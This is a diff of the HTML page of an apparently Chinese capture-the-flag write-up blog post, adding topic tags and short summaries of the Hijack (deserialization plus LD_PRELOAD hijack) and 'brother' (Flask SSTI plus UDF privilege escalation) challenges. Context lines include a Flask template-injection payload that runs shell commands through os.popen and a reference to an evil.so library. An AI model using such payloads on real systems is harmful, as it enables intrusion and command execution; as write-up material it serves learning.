@@ -245,6 +245,38 @@
         </span>
         
         
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/SSTI/" style="color: #ffa2c4">SSTI</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/CVE/" style="color: #ffa2c4">CVE</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E6%8F%90%E6%9D%83/" style="color: #00a596">提权</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Spring/" style="color: #03a9f4">Spring</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/JNDI/" style="color: #00bcd4">JNDI</a>
+            </span>
+            
+        </span>
+        
         <!--文章字数统计-->
         
             
@@ -263,7 +295,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">12分</span>
+        <span class="post-count">13分</span>
       </span>
     </span>
     
@@ -284,7 +316,10 @@
 <span id="more"></span>
 
 <hr>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h2><blockquote>
+<p>反序列化 + ld_preload劫持</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -481,7 +516,10 @@ base64 evil.so <span class="token parameter variable">-w</span> <span class="tok
 <p>得到flag的位置：&#x2F;flag_9e6244c7d4c5bd9cf815</p>
 <p>故技重施即可得到flag</p>
 <hr>
-<h2 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h2><p>进去，直接给了个参数<code>name</code>，看了下框架是python的flask，那直接猜ssti</p>
+<h2 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h2><blockquote>
+<p>flask ssti + udf提权</p>
+</blockquote>
+<p>进去，直接给了个参数<code>name</code>，看了下框架是python的flask，那直接猜ssti</p>
 <p>测了下发现没过滤，直接传payload弹shell</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
